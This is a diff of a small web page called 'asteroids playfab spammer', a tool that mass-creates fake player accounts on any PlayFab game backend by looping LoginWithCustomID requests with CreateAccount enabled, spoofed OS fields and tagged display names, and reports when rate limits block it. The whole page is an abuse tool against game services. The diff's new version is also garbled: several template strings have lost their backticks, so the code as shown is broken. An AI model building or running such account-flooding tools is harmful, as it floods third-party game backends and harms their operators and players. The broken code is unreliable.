@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/9/97/The_Earth_seen_from_Apollo_17.jpg" type="image/jpeg">
@@ -9,8 +8,34 @@
     <title>asteroid.lol</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-    <script>
-        async function spamPlayFab() {
+    <script type="importmap">
+        { "imports": { "config": "/config.js" } }
+    </script>
+    <style>
+        body {
+            cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path d="M2 2 L14 14 M14 2 L2 14" stroke="purple" stroke-width="2"/></svg>') 8 8, auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="#">playfab spammer</a>
+        <a>soon</a>
+        <a>soon</a>
+        <a>soon</a>
+    </div>
+    <div class="container">
+        <h1>asteroids playfab spammer</h1>
+        <label for="titleId">title id:</label>
+        <input type="text" id="titleIdInput" placeholder="type your title id here!" value="">
+        <label for="numUsers">accounts to make:</label>
+        <input type="number" id="numUsers" placeholder=1 value="1">
+        <button id="spamButton">launch</button>
+        <div id="status"></div>
+    </div>
+    <div id="footer"><b>asteroid.lol</b></div>
+    <script type="module">
+        document.getElementById('spamButton').addEventListener('click', async () => {
             const titleId = document.getElementById('titleIdInput').value;
             const numUsers = parseInt(document.getElementById('numUsers').value, 10);
             const statusDiv = document.getElementById('status');
@@ -23,41 +48,33 @@
             statusDiv.textContent = 'starting...';
 
             for (let i = 0; i < numUsers; i++) {
-                const bomb = [...Array(5)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".charAt(Math.floor(Math.random() * 36))).join('');
-                const request = {
-                    CustomId: "ASTEROIDRUNSYOU-" + bomb,
-                    CreateAccount: true,
-                    DisplayName: "NO-SKID" + [...Array(5)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".charAt(Math.floor(Math.random() * 36))).join('')
-                };
-                
                 try {
-                    await axios.post(`https://${titleId}.playfabapi.com/Client/LoginWithCustomID`, request);
-                    statusDiv.textContent = `made player ${i + 1}/${numUsers}.`;
+                    const response = await axios.post(https://${titleId}.playfabapi.com/Client/LoginWithCustomID, {
+                        CustomId: asteroidtoolsontop${Date.now()}${i},
+                        CreateAccount: true,
+                        TitleId: titleId,
+                        InfoRequestParameters: {
+                            UserDisplayName: "PROJECTNUGGETONTOP",
+                        },
+                        OS: "ANDROID",
+                    });
+
+                    if (response.data && response.data.data && response.data.data.SessionTicket) {
+                        statusDiv.textContent = made player ${i + 1}/${numUsers}.;
+                    } else {
+                        statusDiv.textContent = failed on player ${i + 1}.;
+                    }
                 } catch (error) {
-                    statusDiv.textContent = `couldn't make player ${i + 1}.`;
+                    if (error.response && error.response.status === 429) {
+                        statusDiv.textContent = player ${i + 1}/${numUsers} skipped cause of playfabs rate limitations, rip;
+                    } else {
+                        statusDiv.textContent = couldn't make player ${i + 1}.;
+                    }
                 }
             }
 
             statusDiv.textContent = 'done...!';
-        }
+        });
     </script>
-</head>
-<body>
-    <div class="header">
-        <a href="#">playfab spammer</a>
-        <a>soon</a>
-        <a>soon</a>
-        <a>soon</a>
-    </div>
-    <div class="container">
-        <h1>asteroids playfab spammer</h1>
-        <label for="titleId">title id:</label>
-        <input type="text" id="titleIdInput" placeholder="type your title id here!">
-        <label for="numUsers">accounts to make:</label>
-        <input type="number" id="numUsers" placeholder=1 value="1">
-        <button onclick="spamPlayFab()">launch</button>
-        <div id="status"></div>
-    </div>
-    <div id="footer"><b>asteroid.lol</b></div>
 </body>
 </html>
